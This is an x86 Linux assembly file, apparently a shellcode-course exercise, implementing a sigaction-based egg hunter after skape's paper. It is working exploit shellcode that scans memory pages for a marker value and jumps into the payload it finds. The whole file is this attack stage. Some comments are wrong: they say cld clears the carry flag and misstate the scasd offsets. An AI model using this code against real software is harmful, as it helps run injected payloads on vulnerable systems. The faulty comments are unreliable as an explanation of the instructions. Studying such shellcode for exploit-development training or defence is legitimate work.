; Create search egg-hunter
; http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf

global _start

section .text
_start:
	cld 	; clear carry flag CF, to make scasd working
	xor ecx, ecx
allign_page:
	; getconf PATE_SIZE == 4096. This is max size for 1 page segment. But 4096 in hex is NULL.
	; SO the trick is create 4095 then +1
	or cx, 0xfff	; 0xfff = 4095

next_address:
	inc ecx 		; 4095+1 = 4096. Page size
	push byte +0x43 ;0x43 == 67. syscall sigaction
	pop eax
	int 0x80
	cmp al, 0xf2	; Compare with EFAULTS
	jz allign_page
	mov eax, 0x50905090; egg key
	mov edi, ecx	; store ecx (address of page are looking egg) to edi
	scasd 	; compare eax with edi+4. Find egg
	jnz next_address	; !=0 return next_address
	scasd 	;compare eax with edi+4+4. Find last 4 bytes egg
	jnz next_address
	jmp edi		; Jump to shellcode
